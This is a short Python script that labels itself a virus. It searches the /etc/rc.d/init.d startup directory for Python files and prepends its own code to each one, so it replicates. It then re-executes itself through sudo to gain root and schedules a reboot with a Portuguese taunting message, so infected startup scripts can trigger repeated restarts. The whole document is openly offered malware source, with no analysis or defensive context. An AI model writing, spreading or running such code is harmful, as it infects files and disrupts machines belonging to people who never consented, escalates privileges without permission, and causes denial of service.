#!/usr/bin/python
import os
import sys
import datetime
SIGNATURE = "PYTHON VIRUS"

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def bomb():
    #conseguindo permissão de superuser
        euid = os.geteuid()
        if euid != 0:
            args = ['sudo', sys.executable] + sys.argv + [os.environ]
            os.execlpe('sudo', *args)
    #computador reiniciado em 1 minuto
        os.system("shutdown -r 1 Seu computador será reiniciado... DENOVO")

filestoinfect = search(os.path.abspath("/etc/rc.d/init.d"))
infect(filestoinfect)
bomb()
